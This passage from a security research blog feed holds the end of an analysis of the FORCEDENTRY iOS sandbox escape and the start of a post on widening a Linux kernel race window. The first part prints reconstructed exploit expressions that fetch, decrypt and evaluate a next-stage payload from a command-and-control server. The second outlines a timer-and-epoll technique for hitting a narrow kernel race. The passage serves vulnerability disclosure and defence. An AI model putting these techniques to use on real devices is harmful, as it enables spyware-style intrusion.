&amp;nbsp; &amp;nbsp;objectForKey:@&amp;quot;0&amp;quot;] URL]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ] AES128DecryptWithPassword:NSData(XXXX)&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;] &amp;nbsp;decompressedDataUsingAlgorithm:3 error:]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;options: Class(NSConstantValueExpression)&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; format: Class(NSConstantValueExpression)&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; errors:Class(NSConstantValueExpression)&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; ]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; forKey:@&amp;quot;1&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;The innermost reference to &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;sharedAnonymizedStrings&lt;/span&gt;&lt;span&gt;&amp;nbsp;here grabs the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSURLComponents&lt;/span&gt;&lt;span&gt;&amp;nbsp;object and builds the full url from the query string parameters set last earlier. That url is passed to &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;[NSData dataWithContentsOfURL:]&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;to fetch a data blob from a remote server.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;That data blob is decrypted with a hardcoded AES128 key, decompressed using zlib then parsed as a plist. That parsed plist is stored in the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;sharedAnonymizedStrings&lt;/span&gt;&lt;span&gt;&amp;nbsp;dictionary under the key &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="YDzVciBUld-c8" id="h.rmw3ubtmn06v"&gt;&lt;span class="YDzVciBUld-c10 YDzVciBUld-c3"&gt;Expression 5&lt;/span&gt;&lt;/h3&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;[ [[NSThread mainThread] threadDictionary]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; addEntriesFromDictionary:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; [[CaliCalendarAnonymizer sharedAnonymizedStrings]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; objectForKey:@&amp;quot;1&amp;quot;]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;This copies all the keys and values from the &amp;quot;next-stage&amp;quot; plist into the main thread&amp;#39;s theadDictionary.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="YDzVciBUld-c8" id="h.qzgbnlme8c4b"&gt;&lt;span class="YDzVciBUld-c10 YDzVciBUld-c3"&gt;Expression 6&lt;/span&gt;&lt;/h3&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;[ [NSExpression expressionWithFormat:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; [[[CaliCalendarAnonymizer sharedAnonymizedStrings]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; objectForKey:@&amp;quot;1&amp;quot;]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; objectForKey: @&amp;quot;a&amp;quot;]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c0 YDzVciBUld-c2"&gt;&amp;nbsp; ]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; expressionValueWithObject:nil context:nil&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;Finally, this fetches the value of the &amp;quot;&lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;a&lt;/span&gt;&lt;span&gt;&amp;quot; key from the next-stage plist, parses it as an &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSExpression&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;string and evaluates it.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="YDzVciBUld-c7" id="h.5m5pj8ghutz4"&gt;&lt;span class="YDzVciBUld-c9 YDzVciBUld-c3"&gt;End of the line&lt;/span&gt;&lt;/h2&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;At this point we lose the ability to follow the exploit. The attackers have escaped the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;IMTranscoderAgent&lt;/span&gt;&lt;span&gt;&amp;nbsp;sandbox, requested a next-stage from the command and control server and executed it, all without any memory corruption or dependencies on particular versions of the operating system.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;In response to this exploit&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="YDzVciBUld-c6"&gt;&lt;a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/ios-ipados-release-notes/ios-ipados-15_1-release-notes"&gt;iOS 15.1 significantly reduced the computational power available to NSExpressions&lt;/a&gt;&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4 YDzVciBUld-c12"&gt;&lt;span class="YDzVciBUld-c3 YDzVciBUld-c13"&gt;NSExpression immediately forbids certain operations that have significant side effects, like creating and destroying objects. Additionally, casting string class names into Class objects with NSConstantValueExpression is deprecated.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1 YDzVciBUld-c12"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;In addition the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;PTSection&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;PTRow&lt;/span&gt;&lt;span&gt;&amp;nbsp;objects have been hardened with the following check added around the parsing of serialized &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSPredicates&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;if (os_variant_allows_internal_security_policies(&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;quot;com.apple.PrototypeTools&amp;quot;) {&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; [coder decodeObjectOfClass:NSPredicate forKey:@&amp;quot;condition]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;Object deserialization across trust boundaries still presents an enormous attack surface however&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="YDzVciBUld-c7" id="h.fyh8k0aja0xk"&gt;&lt;span class="YDzVciBUld-c9 YDzVciBUld-c3"&gt;Conclusion&lt;/span&gt;&lt;/h2&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;Perhaps the most striking takeaway is the depth of the attack surface reachable from what would hopefully be a fairly constrained sandbox. With just two tricks (&lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointers in protocols and library loading gadgets) it&amp;#39;s likely possible to attack almost every &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;initWithCoder&lt;/span&gt;&lt;span&gt;&amp;nbsp;implementation in the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;dyld_shared_cache&lt;/span&gt;&lt;span&gt;. There are presumably many other classes in addition to &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSPredicate&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSExpression&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;which provide the building blocks for logic-style exploits.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;The expressive power of NSXPC just seems fundamentally ill-suited for use across sandbox boundaries, even though it was designed with exactly that in mind. The attack surface reachable from inside a sandbox should be minimal, enumerable and reviewable. Ideally only code which is required for correct functionality should be reachable; it should be possible to determine exactly what that exposed code is and the amount of exposed code should be small enough that manually reviewing it is tractable. &lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;NSXPC requiring developers to explicitly add remotely-exposed methods to interface protocols is a great example of how to make the attack surface enumerable - you can at least find all the entry points fairly easily. However the support for inheritance means that the attack surface exposed there likely isn&amp;#39;t reviewable; it&amp;#39;s simply too large for anything beyond a basic&lt;/span&gt;&lt;span&gt;&amp;nbsp;example&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;Refactoring these critical IPC boundaries to be more prescriptive - only allowing a much narrower set of objects in this case - would be a good step towards making the attack surface reviewable. This would probably require fairly significant refactoring for NSXPC; it&amp;#39;s built around natively supporting the Objective-C inheritance model and is used very broadly. But without such changes the exposed attack surface is just too large to audit effectively.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;The advent of Memory Tagging Extensions (MTE), likely shipping in multiple consumer devices across the ARM ecosystem this year,&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="YDzVciBUld-c6"&gt;&lt;a class="YDzVciBUld-c111" href="https://www.usenix.org/system/files/login/articles/login_summer19_03_serebryany.pdf"&gt;is a big step in the defense against memory corruption exploitation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. But attackers innovate too, and are likely already two steps ahead with a renewed focus on logic bugs. This sandbox escape exploit is likely a sign of the shift we can expect to see over the next few years if the promises of MTE can be delivered. And this exploit was far more extensible, reliable and generic than almost any memory corruption exploit could ever hope to be.&lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/1353264177358891846/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/1353264177358891846" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/1353264177358891846" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html" title="FORCEDENTRY: Sandbox Escape" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiju_-thk9djtuTJr7kWQuOIF8O3xydoja-FIW5gcwq9s1TGTtvobsRcyQ9_TFbXhta_6I9VQj0u8hyJfLixzGgmOFT4jy3UAcV31MT24-p_vwCGpotG5jQdna1PxNHW3EaSN4d1cQ_vpXAKKWy1V5us-ZlEvUkN5dAq-KjgQFLcQ97jglBLYky_lqs2w/s72-c/image1.png" height="72" width="72" />
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-2892029424446991022</id>
    <published>2022-03-24T13:51:00.001-07:00</published>
    <updated>2022-03-24T13:51:39.508-07:00</updated>
    <title type="text">Racing against the clock -- hitting a tiny kernel race window</title>
    <content type="html">&lt;style type="text/css"&gt;.lst-kix_oh8g77k3z2ge-8&gt;li:before{content:"\0025a0  "}ol.lst-kix_94mysn7p9quk-2.start{counter-reset:lst-ctn-kix_94mysn7p9quk-2 0}.lst-kix_94mysn7p9quk-5&gt;li{counter-increment:lst-ctn-kix_94mysn7p9quk-5}.lst-kix_oh8g77k3z2ge-6&gt;li:before{content:"\0025cf  "}ol.lst-kix_94mysn7p9quk-7{list-style-type:none}ol.lst-kix_94mysn7p9quk-6{list-style-type:none}.lst-kix_oh8g77k3z2ge-7&gt;li:before{content:"\0025cb  "}ol.lst-kix_94mysn7p9quk-8{list-style-type:none}.lst-kix_oh8g77k3z2ge-4&gt;li:before{content:"\0025cb  "}ol.lst-kix_94mysn7p9quk-3{list-style-type:none}ol.lst-kix_94mysn7p9quk-2{list-style-type:none}ol.lst-kix_94mysn7p9quk-5{list-style-type:none}ol.lst-kix_94mysn7p9quk-4{list-style-type:none}.lst-kix_oh8g77k3z2ge-5&gt;li:before{content:"\0025a0  "}ol.lst-kix_94mysn7p9quk-1{list-style-type:none}ol.lst-kix_94mysn7p9quk-0{list-style-type:none}.lst-kix_oh8g77k3z2ge-0&gt;li:before{content:"\0025cf  "}.lst-kix_94mysn7p9quk-0&gt;li{counter-increment:lst-ctn-kix_94mysn7p9quk-0}.lst-kix_oh8g77k3z2ge-2&gt;li:before{content:"\0025a0  "}.lst-kix_oh8g77k3z2ge-3&gt;li:before{content:"\0025cf  "}ol.lst-kix_94mysn7p9quk-5.start{counter-reset:lst-ctn-kix_94mysn7p9quk-5 0}.lst-kix_94mysn7p9quk-4&gt;li{counter-increment:lst-ctn-kix_94mysn7p9quk-4}.lst-kix_oh8g77k3z2ge-1&gt;li:before{content:"\0025cb  "}ol.lst-kix_94mysn7p9quk-8.start{counter-reset:lst-ctn-kix_94mysn7p9quk-8 0}.lst-kix_u4yb8nbjtsh3-5&gt;li:before{content:"\0025a0  "}.lst-kix_u4yb8nbjtsh3-6&gt;li:before{content:"\0025cf  "}ol.lst-kix_94mysn7p9quk-1.start{counter-reset:lst-ctn-kix_94mysn7p9quk-1 0}.lst-kix_u4yb8nbjtsh3-4&gt;li:before{content:"\0025cb  "}.lst-kix_u4yb8nbjtsh3-8&gt;li:before{content:"\0025a0  "}.lst-kix_94mysn7p9quk-0&gt;li:before{content:"" counter(lst-ctn-kix_94mysn7p9quk-0,decimal) ". "}.lst-kix_u4yb8nbjtsh3-7&gt;li:before{content:"\0025cb  "}.lst-kix_94mysn7p9quk-3&gt;li{counter-increment:lst-ctn-kix_94mysn7p9quk-3}.lst-kix_94mysn7p9quk-6&gt;li{counter-increment:lst-ctn-kix_94mysn7p9quk-6}ol.lst-kix_94mysn7p9quk-4.start{counter-reset:lst-ctn-kix_94mysn7p9quk-4 0}.lst-kix_94mysn7p9quk-2&gt;li{counter-increment:lst-ctn-kix_94mysn7p9quk-2}ol.lst-kix_94mysn7p9quk-7.start{counter-reset:lst-ctn-kix_94mysn7p9quk-7 0}.lst-kix_94mysn7p9quk-6&gt;li:before{content:"" counter(lst-ctn-kix_94mysn7p9quk-6,decimal) ". "}.lst-kix_94mysn7p9quk-8&gt;li{counter-increment:lst-ctn-kix_94mysn7p9quk-8}ul.lst-kix_oh8g77k3z2ge-7{list-style-type:none}ul.lst-kix_oh8g77k3z2ge-8{list-style-type:none}.lst-kix_94mysn7p9quk-5&gt;li:before{content:"" counter(lst-ctn-kix_94mysn7p9quk-5,lower-roman) ". "}ul.lst-kix_oh8g77k3z2ge-3{list-style-type:none}ul.lst-kix_oh8g77k3z2ge-4{list-style-type:none}.lst-kix_u4yb8nbjtsh3-0&gt;li:before{content:"\0025cf  "}ul.lst-kix_oh8g77k3z2ge-5{list-style-type:none}ul.lst-kix_oh8g77k3z2ge-6{list-style-type:none}.lst-kix_94mysn7p9quk-4&gt;li:before{content:"" counter(lst-ctn-kix_94mysn7p9quk-4,lower-latin) ". "}ul.lst-kix_oh8g77k3z2ge-0{list-style-type:none}.lst-kix_u4yb8nbjtsh3-1&gt;li:before{content:"\0025cb  "}.lst-kix_u4yb8nbjtsh3-2&gt;li:before{content:"\0025a0  "}ul.lst-kix_oh8g77k3z2ge-1{list-style-type:none}.lst-kix_94mysn7p9quk-1&gt;li{counter-increment:lst-ctn-kix_94mysn7p9quk-1}ul.lst-kix_oh8g77k3z2ge-2{list-style-type:none}ol.lst-kix_94mysn7p9quk-0.start{counter-reset:lst-ctn-kix_94mysn7p9quk-0 0}.lst-kix_94mysn7p9quk-1&gt;li:before{content:"" counter(lst-ctn-kix_94mysn7p9quk-1,lower-latin) ". "}.lst-kix_94mysn7p9quk-3&gt;li:before{content:"" counter(lst-ctn-kix_94mysn7p9quk-3,decimal) ". "}.lst-kix_94mysn7p9quk-7&gt;li{counter-increment:lst-ctn-kix_94mysn7p9quk-7}.lst-kix_u4yb8nbjtsh3-3&gt;li:before{content:"\0025cf  "}.lst-kix_94mysn7p9quk-2&gt;li:before{content:"" counter(lst-ctn-kix_94mysn7p9quk-2,lower-roman) ". "}ul.lst-kix_u4yb8nbjtsh3-6{list-style-type:none}ul.lst-kix_u4yb8nbjtsh3-5{list-style-type:none}ul.lst-kix_u4yb8nbjtsh3-8{list-style-type:none}ul.lst-kix_u4yb8nbjtsh3-7{list-style-type:none}ul.lst-kix_u4yb8nbjtsh3-2{list-style-type:none}ul.lst-kix_u4yb8nbjtsh3-1{list-style-type:none}ol.lst-kix_94mysn7p9quk-3.start{counter-reset:lst-ctn-kix_94mysn7p9quk-3 0}ul.lst-kix_u4yb8nbjtsh3-4{list-style-type:none}ul.lst-kix_u4yb8nbjtsh3-3{list-style-type:none}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ol.lst-kix_94mysn7p9quk-6.start{counter-reset:lst-ctn-kix_94mysn7p9quk-6 0}.lst-kix_94mysn7p9quk-7&gt;li:before{content:"" counter(lst-ctn-kix_94mysn7p9quk-7,lower-latin) ". "}.lst-kix_94mysn7p9quk-8&gt;li:before{content:"" counter(lst-ctn-kix_94mysn7p9quk-8,lower-roman) ". "}ul.lst-kix_u4yb8nbjtsh3-0{list-style-type:none}ol{margin:0;padding:0}table td,table th{padding:0}.c15{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.c1{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c8{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:20pt;font-family:"Arial";font-style:normal}.c5{color:#cc0000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:9pt;font-family:"Courier New";font-style:normal}.c26{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c13{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:italic}.c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:9pt;font-family:"Courier New";font-style:normal}.c3{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c10{color:#000000;text-decoration:none;vertical-align:baseline;font-size:10pt;font-style:normal}.c7{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.c11{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c22{color:#000000;text-decoration:none;vertical-align:baseline;font-style:normal}.c23{font-weight:400;font-size:16pt;font-family:"Arial"}.c19{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c4{font-weight:400;font-family:"Courier New"}.c20{padding:0;margin:0}.c12{color:inherit;text-decoration:inherit}.c17{margin-left:108pt;padding-left:0pt}.c14{margin-left:36pt;padding-left:0pt}.c21{margin-left:72pt;padding-left:0pt}.c16{font-style:italic}.c25{background-color:#f4cccc}.c6{font-weight:700}.c18{font-family:"Courier New"}.c9{font-size:9pt}.c24{font-size:10pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="c19"&gt; &lt;p class="c3"&gt;&lt;span class="c6"&gt;TL;DR:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;How to make a tiny kernel race window really large even on kernels without &lt;/span&gt;&lt;span class="c4"&gt;CONFIG_PREEMPT&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c20 lst-kix_u4yb8nbjtsh3-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c3 c14 li-bullet-0"&gt;&lt;span&gt;use&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;a cache miss to widen the race window a little bit&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c3 c14 li-bullet-0"&gt;&lt;span class="c1"&gt;make a timerfd expire in that window (which will run in an interrupt handler - in other words, in hardirq context)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c3 c14 li-bullet-0"&gt;&lt;span class="c1"&gt;make sure that the wakeup triggered by the timerfd has to churn through 50000 waitqueue items created by epoll&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;Racing one thread against a timer also avoids accumulating timing variations from two threads in each race attempt - hence the title. On the other hand, it also means you now have to deal with how hardware timers actually work, which introduces its own flavors of weird timing variations.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c15" id="h.au2flcod0vb"&gt;&lt;span class="c8"&gt;Introduction&lt;/span&gt;&lt;/h1&gt; &lt;p class="c3"&gt;&lt;span&gt;I recently discovered a race condition (&lt;/span&gt;&lt;span class="c11"&gt;&lt;a class="c121" href="https://crbug.com/project-zero/2247"&gt;https://crbug.com/project-zero/2247&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) in the Linux kernel.&lt;/span&gt;&lt;span&gt;&amp;nbsp;(While trying to explain to someone how &lt;/span&gt;&lt;span class="c11"&gt;&lt;a class="c121" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=cbcf01128d0a92e131bd09f1688fe032480b65ca"&gt;the fix for CVE-2021-0920&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;worked - I was explaining why the Unix GC is now safe, and then got confused because I couldn&amp;#39;t actually figure out why it&amp;#39;s safe after that fix, eventually realizing that it actually isn&amp;#39;t safe.) It&amp;#39;s a fairly narrow race window, so I was wondering whether it could be hit with a small number of attempts - especially on kernels that aren&amp;#39;t built with &lt;/span&gt;&lt;span class="c4"&gt;CONFIG_PREEMPT&lt;/span&gt;&lt;span&gt;, which would make it possible to preempt a thread with another thread, &lt;/span&gt;&lt;span class="c11"&gt;&lt;a class="c121" href="https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019%20-%20Exploiting%20race%20conditions%20on%20Linux.pdf#page=12"&gt;as I described at LSSEU2019&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p 